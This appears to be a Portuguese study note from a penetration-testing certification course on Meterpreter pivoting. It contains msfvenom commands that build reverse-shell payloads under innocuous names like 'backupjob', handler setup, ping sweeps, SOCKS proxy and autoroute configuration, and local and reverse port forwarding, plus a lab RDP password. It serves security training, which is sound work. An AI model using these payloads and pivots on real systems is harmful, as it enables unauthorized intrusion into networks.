> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/pivoting-tunneling-and-port-forwarding/meterpreter-tunneling-and-port-forwarding.md).

# Meterpreter Tunneling & Port Forwarding

Agora, vamos considerar um cenário em que temos nosso acesso ao shell Meterpreter no servidor Ubuntu (o host pivot), e queremos executar varreduras de enumeração por meio do host pivot, mas gostaríamos de aproveitar as conveniências que as sessões Meterpreter nos trazem. Nesses casos, ainda podemos criar um pivot com nossa sessão Meterpreter sem depender do encaminhamento de porta SSH. Podemos criar um shell Meterpreter para o servidor Ubuntu com o comando abaixo, que retornará um shell em nosso host de ataque na porta `8080`.

* **Criando Payload para o Ubuntu Pivot Host**

```sh
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

* **Configurando e iniciando o multi/handler**

{% code lineNumbers="true" %}

```sh
msfconsole -q
use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp
run
```

{% endcode %}

* Podemos copiar o `backupjob`arquivo binário para o host pivot do Ubuntu `over SSH`e executá-lo para obter uma sessão do Meterpreter.

```sh
scp backupscript ubuntu@<ipAddressofTarget>:~/
```

* **Executando a carga útil no host Pivot**

{% code lineNumbers="true" %}

```sh
chmod +x backupjob 
./backupjob
```

{% endcode %}

* Precisamos ter certeza de que a sessão do Meterpreter foi estabelecida com sucesso ao executar a carga útil.
* **Varredura de ping**

```sh
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

* **Ping Sweep For Loop em hosts Linux Pivot**

```sh
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

* **Varredura de ping para loop usando CMD**

```powershell
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

* **Varredura de ping usando PowerShell**

```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

***

### **Configurando o proxy SOCKS do MSF**

{% code lineNumbers="true" %}

```sh
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```

{% endcode %}

* **Confirmando que o servidor proxy está em execução**

```
> jobs
```

***

### **Criando rotas com AutoRoute**

{% code lineNumbers="true" %}

```sh
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run
```

{% endcode %}

* Também é possível adicionar rotas com autoroute executando autoroute na sessão Meterpreter.

```sh
run autoroute -s 172.16.5.0/23
```

* **Listando rotas ativas com AutoRoute**

```sh
run autoroute -p
```

* **Testando a funcionalidade de proxy e roteamento**

```sh
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

***

### Encaminhamento de porta

* **Opções de Portfwd**

```sh
help portfwd
```

* **Criando um Relay TCP Local**

```sh
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

* **Conectando ao Windows Target por meio do localhost**

```sh
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

* **Saída Netstat**

```sh
netstat -antp
```

***

### Meterpreter Reverso Port Forwarding

* **Regras de encaminhamento de porta reversa**

```sh
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

* **Configurando e iniciando multi/handler**

{% code lineNumbers="true" %}

```sh
bg
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 8081 
set LHOST 0.0.0.0 
run
```

{% endcode %}

* **Gerando a carga útil do Windows**

```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

* Por fim, se executarmos nossa carga útil no host Windows, poderemos receber um shell do Windows dinamizado por meio do servidor Ubuntu.
